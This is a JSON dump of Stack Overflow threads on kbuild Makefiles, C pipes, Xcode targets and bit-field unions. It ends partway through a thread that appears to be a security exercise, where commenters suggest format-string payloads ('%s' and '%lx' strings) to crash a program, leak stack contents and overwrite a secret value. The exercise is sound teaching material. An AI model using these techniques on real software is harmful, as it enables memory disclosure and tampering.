{"reputation": 86085, "user_id": 128940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d35101b4060dc3af0d5c1b7c42c4935?s=128&d=identicon&r=PG&f=1", "display_name": "Beta", "link": "https://stackoverflow.com/users/128940/beta"}, "reply_to_user": {"reputation": 8774, "user_id": 371862, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/d995a45f7c20d510e5a95eee1c0e2b98?s=128&d=identicon&r=PG", "display_name": "Jordan", "link": "https://stackoverflow.com/users/371862/jordan"}, "edited": false, "score": 0, "creation_date": 1476720350, "post_id": 40090359, "comment_id": 67454582, "body": "@Jordan: I&#39;m not going to sift through that huge document in the hopes of guessing correctly how to use a tool I don&#39;t have to experiment with. If your real question is how to use kbuild, I can&#39;t help you."}, {"owner": {"reputation": 8774, "user_id": 371862, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/d995a45f7c20d510e5a95eee1c0e2b98?s=128&d=identicon&r=PG", "display_name": "Jordan", "link": "https://stackoverflow.com/users/371862/jordan"}, "edited": false, "score": 0, "creation_date": 1476723870, "post_id": 40090359, "comment_id": 67456535, "body": "Yep, that&#39;s fair thanks. My question was more directed specifically at how to do this with kbuild, I wouldn&#39;t ask anyone who isn&#39;t familiar with it. Cheers"}], "tags": [], "owner": {"reputation": 86085, "user_id": 128940, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9d35101b4060dc3af0d5c1b7c42c4935?s=128&d=identicon&r=PG&f=1", "display_name": "Beta", "link": "https://stackoverflow.com/users/128940/beta"}, "is_accepted": false, "score": 1, "last_activity_date": 1476718324, "creation_date": 1476718324, "answer_id": 40090359, "question_id": 40006803, "link": "https://stackoverflow.com/questions/40006803/how-to-chain-kbuild-makefiles-properly-to-build-subfolders-inside-kernel-module/40090359#40090359", "title": "How to chain KBuild Makefiles properly to build subfolders inside kernel module", "body": "<p>This doesn't seem too difficult.</p>\n\n<p><strong>mymodule/Makefile:</strong></p>\n\n<pre><code>...\ninclude ../foo/Makefile\n...\n# whatever rules use the folder-specific flags:\nfoo:\n    gcc blah blah $(FOLDERFLAGS) blah\n</code></pre>\n\n<p><strong>../foo/component1/Makefile:</strong></p>\n\n<pre><code>FOLDER_FILES := foo1file.o foo2file.o foo3file.o #etc\n$(FOLDER_FILES): FOLDER_FLAGS=folder_1_flag\nFOO_FILES += FOLDER_FILES\n</code></pre>\n\n<p><strong>../foo/component2/Makefile:</strong></p>\n\n<pre><code>FOLDER_FILES := foo20file.o foo21file.o foo22file.o #etc\n$(FOLDER_FILES): FOLDER_FLAGS=folder_2_flag\nFOO_FILES += FOLDER_FILES\n</code></pre>\n\n<p>Is that sufficient for your purposes?</p>\n"}, {"tags": [], "owner": {"reputation": 3116, "user_id": 2498790, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/991601e5d41d9d84ab7e196382ea8108?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/2498790/alex"}, "is_accepted": false, "score": 0, "last_activity_date": 1477140016, "last_edit_date": 1477140016, "creation_date": 1477095627, "answer_id": 40187083, "question_id": 40006803, "link": "https://stackoverflow.com/questions/40006803/how-to-chain-kbuild-makefiles-properly-to-build-subfolders-inside-kernel-module/40187083#40187083", "title": "How to chain KBuild Makefiles properly to build subfolders inside kernel module", "body": "<p>You can get parent directories working using <code>subdir-</code> and <code>extra-y</code> but is just an overhead and still ccflags per directory wouldn't work. Perhaps the proper way would be to have components as sub-modules, with dependency to mymodule.</p>\n\n<p>I would keep the module build in the top directory <code>mymodule/Makefile</code>, is easy to build multiple modules from one directory but I found nothing about one module from multiple objects in subdirectories (maybe a <em>keep a clean design</em> policy, or just was easier this way).</p>\n\n<p><code>obj-m</code> define the list of kernel modules to build (only one in the example below: <code>hello.ko</code>, is named <code>hello.o</code> but will output <code>hello.ko</code>)</p>\n\n<p><code>hello-objs</code> define the list of compiled <em>objects</em> to link to get <code>hello.ko</code>, by using the same <em>name</em>: <code>hello</code>.</p>\n\n<p>Being a Makefile is easy to link objects conditionally (see <code>CONFIG_HELLO_COMPONENT1</code>)</p>\n\n<p>Eventually if there are many objects per component and we want to keep the top Makefile clean we can still use <code>include</code> but just to <em>conditionally</em> add objects to <code>hello-objs</code> and flags to <code>ccflags-y</code> (or whatever variable needed, just not <code>obj-*</code>).</p>\n\n<p><code>CFLAGS_$*.o</code> (see below) can be used to set per object cflags, but it doesn't honour the path, so objects with the same name in different directories will have the same flags.</p>\n\n<p><code>mymodule/Makefile</code>:</p>\n\n<pre><code>ifeq ($(CONFIG_HELLO_COMPONENT1), y)\n ccflags-y += -I$(src)/foo/component1 -DCONFIG_HELLO_COMPONENT1\nendif\nccflags-y += -I$(src)/foo/component2\n\nobj-m += hello.o\n\nCFLAGS_component2.o += -DTEST_CFLAGS\n\nhello-objs = hello-1.o\nifeq ($(CONFIG_HELLO_COMPONENT1), y)\n hello-objs += foo/component1/component1.o\nendif\nhello-objs += foo/component2/component2.o\n\nall:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n</code></pre>\n\n<p>For completeness below all the files, should build and work, with <code>make</code> or <code>make CONFIG_HELLO_COMPONENT1=y</code>.</p>\n\n<p><code>mymodule/hello-1.c</code>:</p>\n\n<pre><code>#include &lt;linux/module.h&gt;\n#include &lt;linux/kernel.h&gt;\n#include &lt;linux/init.h&gt;\n#ifdef CONFIG_HELLO_COMPONENT1\n#include &lt;component1.h&gt;\n#endif\n#include &lt;component2.h&gt;\nstatic int __init init_hello(void) {\n#ifdef CONFIG_HELLO_COMPONENT1\n    component1();\n#endif\n    component2();\n    printk(KERN_INFO \"Hello world 1.\\n\");\n    return 0;\n}\nstatic void __exit cleanup_hello(void) {\n    printk(KERN_INFO \"Goodbye world 1.\\n\");\n}\nmodule_init(init_hello);\nmodule_exit(cleanup_hello);\n</code></pre>\n\n<p><code>mymodule/foo/component2/component2.h</code>:</p>\n\n<pre><code>#ifndef COMPONENT2_H\n#define COMPONENT2_H\nvoid component2(void);\n#endif\n</code></pre>\n\n<p><code>mymodule/foo/component2/component2.c</code>:</p>\n\n<pre><code>#include &lt;linux/kernel.h&gt;\nvoid component2(void) {\n    printk(KERN_INFO \"component2\\n\");\n}\n</code></pre>\n\n<p><code>mymodule/foo/component1/component1.h</code>:</p>\n\n<pre><code>#ifndef COMPONENT1_H\n#define COMPONENT1_H\nvoid component1(void);\n#endif\n</code></pre>\n\n<p><code>mymodule/foo/component1/component1.c</code>:</p>\n\n<pre><code>#include &lt;linux/kernel.h&gt;\nvoid component1(void) {\n    printk(KERN_INFO \"component1\\n\");\n}\n</code></pre>\n"}], "owner": {"reputation": 8774, "user_id": 371862, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/d995a45f7c20d510e5a95eee1c0e2b98?s=128&d=identicon&r=PG", "display_name": "Jordan", "link": "https://stackoverflow.com/users/371862/jordan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1396, "favorite_count": 0, "answer_count": 2, "score": 4, "last_activity_date": 1477140016, "creation_date": 1476300374, "last_edit_date": 1476469740, "question_id": 40006803, "link": "https://stackoverflow.com/questions/40006803/how-to-chain-kbuild-makefiles-properly-to-build-subfolders-inside-kernel-module", "title": "How to chain KBuild Makefiles properly to build subfolders inside kernel module", "body": "<p>I have a kernel module (often compiled using CONFIG_MYMODULE=m) which is set-up like the following:</p>\n\n<pre><code>mymodule/Makefile\n../foo/Makefile\n../foo/component1/Makefile\n../foo/component2/Makefile\n</code></pre>\n\n<p>Currently what's being used is:</p>\n\n<p><strong>mymodule/Makefile:</strong></p>\n\n<pre><code>mymodule-y += mod1file.o mod2file.o mod3file.o #etc\ninclude ../foo/Makefile\nmymodule-y += $(FOO_FILES)\nobj-$(CONFIG_MYMODULE) += mymodule.o\n</code></pre>\n\n<p><strong>../foo/Makefile:</strong></p>\n\n<pre><code>include component1/Makefile\ninclude component2/Makefile\n</code></pre>\n\n<p>and inside each component folder I have:</p>\n\n<p><strong>../foo/component1/Makefile</strong></p>\n\n<pre><code>FOO_FILES += foo1file.o foo2file.o foo3file.o #etc\n</code></pre>\n\n<hr>\n\n<p>This definitely doesn't appear to be the proper way of going about this, as everything is included directly into the mymodule/Makefile and thus can't set folder-specific gcc flags.</p>\n\n<p>What is the proper way of organizing this while still building everything into a <strong>single kernel module</strong>? I've read the kbuild/modules.txt documentation, but I haven't seen anything which relates directly, and I can't quite figure out how to go about this or if it's indeed possible.</p>\n\n<p>Thanks</p>\n\n<hr>\n\n<p>I've tried the following, but I get the following error:</p>\n\n<blockquote>\n  <p><strong>\"ld: cannot find foo: File format not recognized\"</strong></p>\n</blockquote>\n\n<p><strong>mymodule/Makefile:</strong></p>\n\n<pre><code>mymodule-y += mod1file.o mod2file.o mod3file.o #etc\nmymodule-y += ../foo/\nobj-$(CONFIG_MYMODULE) += mymodule.o\n</code></pre>\n\n<p><strong>../foo/Makefile</strong></p>\n\n<pre><code>ccflags-y := -I$(src)/component1/ -I$(src)/component2/\nfoo-y := foo1file.o foo2file.o foo3file.o\nfoo-y += component1\nfoo-y += component2\n</code></pre>\n\n<p><strong>../foo/component1/Makefile</strong></p>\n\n<pre><code>component1-y := component1file.o component1file.o\n</code></pre>\n\n<p><strong>../foo/component2/Makefile</strong></p>\n\n<pre><code>component2-y := component2file.o component2file.o\n</code></pre>\n\n<p>If I change this to instead use obj-y += ../foo rather than mymodule-y += ../foo it at least enters the folder, but doesn't seem to attempt to complile, and I want this to be all a part of a single kernel module.</p>\n"}, {"tags": ["c", "pipe"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 1, "creation_date": 1476299259, "post_id": 40006225, "comment_id": 67290960, "body": "You should do this with two threads or processes, not loops in the same function. Otherwise you will deadlock when you fill the pipe. Then you should read from the pipe the same way you read from a file: read in a loop until <code>read()</code> returns <code>0</code> to indicate EOF."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1476328428, "post_id": 40006225, "comment_id": 67301227, "body": "I think you should be showing us an MCVE (<a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>).  There are enough problems in the code fragment shown (missing <code>pfd</code> before <code>[WRITE_END]</code>, no loop, not clear what <code>from1</code> is, etc) to make it futile to speculate on what you&#39;re doing right and what you&#39;re doing wrong."}], "owner": {"reputation": 5, "user_id": 5988217, "user_type": "registered", "profile_image": "https://graph.facebook.com/1713277905595507/picture?type=large", "display_name": "Cailean Finn", "link": "https://stackoverflow.com/users/5988217/cailean-finn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 118, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1476298266, "creation_date": 1476298266, "question_id": 40006225, "link": "https://stackoverflow.com/questions/40006225/writing-text-from-a-file-to-a-pipe-then-writing-the-contents-of-the-pipe-to-ano", "title": "Writing text from a file to a pipe, then writing the contents of the pipe to another text file in c", "body": "<p>So I am trying to read from a file then write each character from that file into the pipe, then reading the pipe data and writing the contents of the pipe to another text file.</p>\n\n<p>The problem I am having is in the second part of the pipe as it reads the data onto the pipe perfectly but when I try to write the pipe data to another file it only writes the first char of the pipe. I know I should set up a loop to go through the chars in the pipe and write the chars one after the other into the text file but I dont understand how to do that. I dont have a great understanding of the read() function and that could be my problem but im not sure.</p>\n\n<pre><code>else\n{\n close([WRITE_END]);\n read(pfd[READ_END], &amp;c, 1);\n putc(c, from1);\n}\n</code></pre>\n\n<p>from1 is my second text file that the chars are wrote to.</p>\n\n<p>I still cant figure out how to use the read() function to print out every char in the pipe. As the chars in the pipe are 'hello1', yet it only writes out 'h'.</p>\n\n<p>Any help would be appreciated!</p>\n"}, {"tags": ["c", "xcode", "process", "main"], "answers": [{"comments": [{"owner": {"reputation": 109, "user_id": 4134308, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c42e3344206b1dcd9dc172510ffba95c?s=128&d=identicon&r=PG&f=1", "display_name": "p3ob2lem", "link": "https://stackoverflow.com/users/4134308/p3ob2lem"}, "edited": false, "score": 0, "creation_date": 1476354023, "post_id": 40009012, "comment_id": 67313439, "body": "What a great answer. Thank you so much."}], "tags": [], "owner": {"reputation": 370144, "user_id": 1271826, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/duhm9.jpg?s=128&g=1", "display_name": "Rob", "link": "https://stackoverflow.com/users/1271826/rob"}, "is_accepted": true, "score": 10, "last_activity_date": 1476309621, "last_edit_date": 1476309621, "creation_date": 1476309256, "answer_id": 40009012, "question_id": 40006218, "link": "https://stackoverflow.com/questions/40006218/xcode-multiple-main-methods/40009012#40009012", "title": "xcode multiple main methods", "body": "<p>If you don't want two projects, you can create a second target (\"File\" - \"New\" - \"Target...\" and choose another \"Console app\") for your second program. Put your other <code>main.c</code> there:</p>\n\n<p><a href=\"https://i.stack.imgur.com/O3SQ1.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/O3SQ1.png\" alt=\"two targets\"></a>\n You can also go to the Target settings for the first console app and add a dependency for the second console app, that way, it will build the second, if needed, whenever you run the first one.</p>\n\n<p><a href=\"https://i.stack.imgur.com/fEds5.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/fEds5.png\" alt=\"dependency\"></a></p>\n\n<p>Frankly, this multiple target approach is designed when you have an app with some shared code base, but it can be used in this scenario, too.</p>\n\n<hr>\n\n<p>The other approach is to go ahead and have multiple projects, but work with them under a single \"workspace\". So, create a folder, create your two projects in that folder, and then create a \"Workspace\" (which I called \"MyProject\", in my example below) and add the two <code>xcodeproj</code> files for the two separate projects (\"FirstApp\" and \"SecondApp\" in my example below).</p>\n\n<p>So, in Xcode it looks like:</p>\n\n<p><a href=\"https://i.stack.imgur.com/Ilkhq.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/Ilkhq.png\" alt=\"workspace\"></a></p>\n\n<p>And in the file system, it looks like:</p>\n\n<p><a href=\"https://i.stack.imgur.com/miMVa.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/miMVa.png\" alt=\"filesystem\"></a></p>\n\n<p>So, in this case, you have two projects, but you can work with them together under a single workspace, making it really easy to work with both projects at the same time. Just open that <code>xcworkspace</code> workspace rather than the individual <code>xcodeproj</code> files.</p>\n"}], "owner": {"reputation": 109, "user_id": 4134308, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/c42e3344206b1dcd9dc172510ffba95c?s=128&d=identicon&r=PG&f=1", "display_name": "p3ob2lem", "link": "https://stackoverflow.com/users/4134308/p3ob2lem"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4449, "favorite_count": 1, "accepted_answer_id": 40009012, "answer_count": 1, "score": 5, "last_activity_date": 1476309621, "creation_date": 1476298244, "question_id": 40006218, "link": "https://stackoverflow.com/questions/40006218/xcode-multiple-main-methods", "title": "xcode multiple main methods", "body": "<p>I am using Xcode for c programming. I have a project called system_commands. Inside this project I have a file A, and a file B.</p>\n\n<p>This is file A:</p>\n\n<pre><code>int main(int argc, char *argvector[])\n{\n    char *arguments[] = {\"./runProcesses\",\"Hello\",\"World\",NULL};\n    execvp(\"./runProcesses\", arguments);\n    return 0;\n}\n</code></pre>\n\n<p>File A simply \"executes\" File B, and file B is here:</p>\n\n<pre><code>int main(int argc, char *argvector[])\n{\n\n    for(int i = 0; i &lt; argc; i++)\n    {\n        printf(\"%s\", argvector[i]);\n    }\n//some forks etc\n}\n</code></pre>\n\n<p>Obviously, Xcode will not allow this, since there are two main methods inside the project. But is there a workaround somehow? Do I really have to create another project, so that the files reside in different projects?\nOr is there a way I can execvp() a file without main method?</p>\n"}, {"tags": ["c", "unions"], "comments": [{"owner": {"reputation": 12097, "user_id": 1080064, "user_type": "registered", "accept_rate": 43, "profile_image": "https://graph.facebook.com/100000753306178/picture?type=large", "display_name": "tkausl", "link": "https://stackoverflow.com/users/1080064/tkausl"}, "edited": false, "score": 4, "creation_date": 1476298298, "post_id": 40006207, "comment_id": 67290404, "body": "There are no members with more than 8 bits. <code>union</code> != <code>struct</code>."}, {"owner": {"reputation": 75, "user_id": 6388572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f862e0ea07309b193176caf2367ec8d?s=128&d=identicon&r=PG&f=1", "display_name": "justanotherguy", "link": "https://stackoverflow.com/users/6388572/justanotherguy"}, "reply_to_user": {"reputation": 12097, "user_id": 1080064, "user_type": "registered", "accept_rate": 43, "profile_image": "https://graph.facebook.com/100000753306178/picture?type=large", "display_name": "tkausl", "link": "https://stackoverflow.com/users/1080064/tkausl"}, "edited": false, "score": 0, "creation_date": 1476298641, "post_id": 40006207, "comment_id": 67290607, "body": "@tkausl  got it.. I got confused by mixing struct/union/bit-fields.. :) thanks."}, {"owner": {"reputation": 17175, "user_id": 1756636, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/92f14a1f21e57ba761c7163b2d00a78a?s=128&d=identicon&r=PG&f=1", "display_name": "SomeWittyUsername", "link": "https://stackoverflow.com/users/1756636/somewittyusername"}, "edited": false, "score": 1, "creation_date": 1476298695, "post_id": 40006207, "comment_id": 67290636, "body": "You seem to be confusing size of union with size of union member. Generally, size of union equals to the size of its largest member - in this case it&#39;s one byte, because all the members are chars (rounded to byte-size, because it&#39;s the minimal unit of actual size)"}], "answers": [{"tags": [], "owner": {"reputation": 15409, "user_id": 2877364, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0a101160e41fd7fd75f5fc701f8acb1c?s=128&d=identicon&r=PG", "display_name": "cxw", "link": "https://stackoverflow.com/users/2877364/cxw"}, "is_accepted": true, "score": 5, "last_activity_date": 1476298663, "creation_date": 1476298663, "answer_id": 40006342, "question_id": 40006207, "link": "https://stackoverflow.com/questions/40006207/size-of-bit-field-union-which-has-more-members-than-its-size/40006342#40006342", "title": "Size of bit-field union which has more members than its size", "body": "<p>@tkausl is correct.  In a <code>union</code>, each member overlaps with all the other members in memory.  Therefore, each field in the bitfield overlaps with the others depending on the number of bits in each field and the endianness of the platform.  For example, <code>a1</code> and <code>a10</code> probably always have the same value.</p>\n\n<p>Since all the fields are overlapped in memory, you only need as many bytes as are required to hold the <em>longest</em> field.  Since one byte will do it, that's the size of the <code>union</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "is_accepted": false, "score": 3, "last_activity_date": 1476301333, "creation_date": 1476301333, "answer_id": 40007028, "question_id": 40006207, "link": "https://stackoverflow.com/questions/40006207/size-of-bit-field-union-which-has-more-members-than-its-size/40007028#40007028", "title": "Size of bit-field union which has more members than its size", "body": "<p><em>in what order do the bits get stored in memory ?</em></p>\n\n<p>That is <strong>implementation-defined.</strong></p>\n\n<p>Per <strong>6.7.2.1 Structure and union specifiers</strong>, paragraph 11 of <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow\">the C Standard</a>:</p>\n\n<blockquote>\n  <p>An implementation may allocate any addressable storage unit large\n  enough to hold a bit- field.  If enough space remains, a bit-field\n  that immediately follows another bit-field in a structure shall be\n  packed into adjacent bits of the same unit.  If insufficient space\n  remains, whether  a  bit-field  that  does  not  fit  is  put  into \n  the  next  unit  or  overlaps  adjacent  units  is\n  implementation-defined.  <strong>The order of allocation of bit-fields\n  within a unit (high-order to low-order  or  low-order  to  high-order)\n  is  implementation-defined.</strong>  The  alignment  of  the addressable\n  storage unit is unspecified.</p>\n</blockquote>\n\n<p>Different compilers can implement bit-fields differently.  Note that high-order and low-order is not the same as big-endian or little-endian.  The low-order bit of an 8-bit <code>unsigned char</code> is the one that adds <code>1</code> to it's value when it's flipped on and off.  The high-order bit of the same 8-bit <code>unsigned char</code> is the one that adds 128 to its value when it's flipped on.</p>\n\n<p>So bit-fields have two levels of implementation-defined order:  platform/hardware defined endianness and compiler defined high- or low-order assignment.  You can also the padding between bit fields and whether or not they span adjacent units to the implementation-defined specifics of bit-fields.</p>\n"}], "owner": {"reputation": 75, "user_id": 6388572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f862e0ea07309b193176caf2367ec8d?s=128&d=identicon&r=PG&f=1", "display_name": "justanotherguy", "link": "https://stackoverflow.com/users/6388572/justanotherguy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "accepted_answer_id": 40006342, "answer_count": 2, "score": 0, "last_activity_date": 1490544016, "creation_date": 1476298202, "last_edit_date": 1490544016, "question_id": 40006207, "link": "https://stackoverflow.com/questions/40006207/size-of-bit-field-union-which-has-more-members-than-its-size", "title": "Size of bit-field union which has more members than its size", "body": "<pre><code>#include &lt;stdio.h&gt;\n\nunion mix {\n  unsigned char a1:1;  \n  unsigned char a2:4;\n  unsigned char a3:4;    \n  unsigned char a4:1;  \n  unsigned char a5:4;\n  unsigned char a6:4;    \n  unsigned char a7:1;  \n  unsigned char a8:4;\n  unsigned char a9:4;    \n  unsigned char a10:1;  \n  unsigned char a11:4;\n  unsigned char a12:4;       \n};\n\nint main() {\n\n    printf(\"Sizeof mix = %d bytes\\n\", sizeof(union mix));\n\n    return 0;\n}\n</code></pre>\n\n<p>The output is <strong>1 byte</strong>.</p>\n\n<p>What happens to bit-field members which exceed 8 bits ? Apparently I can still set and get correct values for any bit-field member.</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>Thank you for clearing my confusion. One side question: in what order do the bits get stored in memory ? Assuming it is little endian memory so 0xabcd will be stored in memory as 0xd, 0xc, 0xb, 0xa. </p>\n\n<ol>\n<li>Will m.a1 be part of 0xd OR oxa? </li>\n<li>Will it be bit 3 or bit 0 of 0xd(or 0xa)?</li>\n</ol>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 4854, "user_id": 446357, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2374e43485f6caeb3302e66c327608e2?s=128&d=identicon&r=PG", "display_name": "MTilsted", "link": "https://stackoverflow.com/users/446357/mtilsted"}, "edited": false, "score": 0, "creation_date": 1476298081, "post_id": 40006139, "comment_id": 67290262, "body": "What kind of help do you need. He even marked the place you need to look at: /* Vulnerable place */"}, {"owner": {"reputation": 1014, "user_id": 6047952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a56a0a74a9848b8796170a9bce83e9fa?s=128&d=identicon&r=PG", "display_name": "infixed", "link": "https://stackoverflow.com/users/6047952/infixed"}, "edited": false, "score": 0, "creation_date": 1476298131, "post_id": 40006139, "comment_id": 67290294, "body": "<code>printf</code> uses special character sequences to indicate where values taken from additional arguments should be printed.  Input a string like &quot;%d%d%d%d%d%d%d%d%d%d&quot; and you will trash the stack because you are not providing the additional arguments"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1476298147, "post_id": 40006139, "comment_id": 67290309, "body": "Using user input as a format string -- what could possibly go wrong?"}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1476298300, "post_id": 40006139, "comment_id": 67290405, "body": "You should run this under debugger, examine the relative memory locations of the variables you need to maliciously modify, then figure out how to achieve that with the code marked as the vulnerable spot."}, {"owner": {"reputation": 8445, "user_id": 929459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e420841bacccb72fb934f80069c11d0b?s=128&d=identicon&r=PG", "display_name": "Dmitri", "link": "https://stackoverflow.com/users/929459/dmitri"}, "edited": false, "score": 0, "creation_date": 1476298311, "post_id": 40006139, "comment_id": 67290418, "body": "Although overflowing <code>user_input</code> by entering an extremely large string may work, the <code>&#47;* Vulnerable place *&#47;</code> comment suggests it&#39;s supposed to crash in <code>printf()</code> because of the <i>contents</i> of the string, not in <code>scanf()</code> because of the length..."}, {"owner": {"reputation": 59, "user_id": 5601195, "user_type": "registered", "accept_rate": 7, "profile_image": "https://www.gravatar.com/avatar/a37f6527568735e434d07a2ede342659?s=128&d=identicon&r=PG&f=1", "display_name": "gllwrnce", "link": "https://stackoverflow.com/users/5601195/gllwrnce"}, "edited": false, "score": 0, "creation_date": 1476298529, "post_id": 40006139, "comment_id": 67290543, "body": "See that&#39;s what I&#39;ve been trying. I&#39;ve tried an incredibly long %d string, still didn&#39;t crash it. I&#39;ve tried a few different tricks to try and get it to crash but the program itself still completes and doesn&#39;t crash. Nor does secret[0] or secret[1] get modified. =\\"}, {"owner": {"reputation": 1014, "user_id": 6047952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a56a0a74a9848b8796170a9bce83e9fa?s=128&d=identicon&r=PG", "display_name": "infixed", "link": "https://stackoverflow.com/users/6047952/infixed"}, "edited": false, "score": 0, "creation_date": 1476298706, "post_id": 40006139, "comment_id": 67290640, "body": "Actually a string of &quot;%s%s%s%s%s%s%s%s%s&quot; would have a better chance at being interpreted as a bunch of wild pointers, one which may point to invalid memory"}, {"owner": {"reputation": 59, "user_id": 5601195, "user_type": "registered", "accept_rate": 7, "profile_image": "https://www.gravatar.com/avatar/a37f6527568735e434d07a2ede342659?s=128&d=identicon&r=PG&f=1", "display_name": "gllwrnce", "link": "https://stackoverflow.com/users/5601195/gllwrnce"}, "edited": false, "score": 0, "creation_date": 1476301306, "post_id": 40006139, "comment_id": 67292075, "body": "Nice one. That actually caused a crash right away. Now I just gotta figure out how to modify the secret value. Obviously you can pop it off the stack using something like &quot;%x&quot; but I don&#39;t know how to modify it based on user input from there."}, {"owner": {"reputation": 1014, "user_id": 6047952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a56a0a74a9848b8796170a9bce83e9fa?s=128&d=identicon&r=PG", "display_name": "infixed", "link": "https://stackoverflow.com/users/6047952/infixed"}, "edited": false, "score": 0, "creation_date": 1476302123, "post_id": 40006139, "comment_id": 67292490, "body": "entering too long a string will overwrite the pointer in <code>secret</code>, making it point elsewhere.  That would make if say something different.   Picking characters to point back into the stack, and adding those characters to the input string would do it.  But you need to find where the stack is getting placed.  A bunch of <code>%x</code> in the format may be able to disclose that.  Then craft a new string using that information"}, {"owner": {"reputation": 59, "user_id": 5601195, "user_type": "registered", "accept_rate": 7, "profile_image": "https://www.gravatar.com/avatar/a37f6527568735e434d07a2ede342659?s=128&d=identicon&r=PG&f=1", "display_name": "gllwrnce", "link": "https://stackoverflow.com/users/5601195/gllwrnce"}, "edited": false, "score": 0, "creation_date": 1476302631, "post_id": 40006139, "comment_id": 67292768, "body": "Yeah tried using a bunch of %x in the format, but I don&#39;t see it printing back the 60fea8 address (this is apparently its address according to the first printf of the program)."}, {"owner": {"reputation": 1014, "user_id": 6047952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a56a0a74a9848b8796170a9bce83e9fa?s=128&d=identicon&r=PG", "display_name": "infixed", "link": "https://stackoverflow.com/users/6047952/infixed"}, "edited": false, "score": 0, "creation_date": 1476303063, "post_id": 40006139, "comment_id": 67292988, "body": "A lot will depend on the CPU type,and size of <code>int</code> and endian-ess and how the compiler handles parameters in calls.  Using a <code>%lx</code> or maybe even <code>%llx</code> may give you more bytes in a row.  But then you might have to re-order them to interpret them"}, {"owner": {"reputation": 59, "user_id": 5601195, "user_type": "registered", "accept_rate": 7, "profile_image": "https://www.gravatar.com/avatar/a37f6527568735e434d07a2ede342659?s=128&d=identicon&r=PG&f=1", "display_name": "gllwrnce", "link": "https://stackoverflow.com/users/5601195/gllwrnce"}, "edited": false, "score": 0, "creation_date": 1476303340, "post_id": 40006139, "comment_id": 67293127, "body": "Well I&#39;m still kind of lost then lol."}, {"owner": {"reputation": 1014, "user_id": 6047952, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a56a0a74a9848b8796170a9bce83e9fa?s=128&d=identicon&r=PG", "display_name": "infixed", "link": "https://stackoverflow.com/users/6047952/infixed"}, "edited": false, "score": 0, "creation_date": 1476303656, "post_id": 40006139, "comment_id": 67293291, "body": "Try making a format string with a dozen <code>%lx</code> at the start,  then pad it up to 100 characters with capital U&#39;s.  Those should print out as &quot;55&quot; in the hex output.  That will give you a handle on where the offset to the end of <code>user_input</code> buffer is"}, {"owner": {"reputation": 59, "user_id": 5601195, "user_type": "registered", "accept_rate": 7, 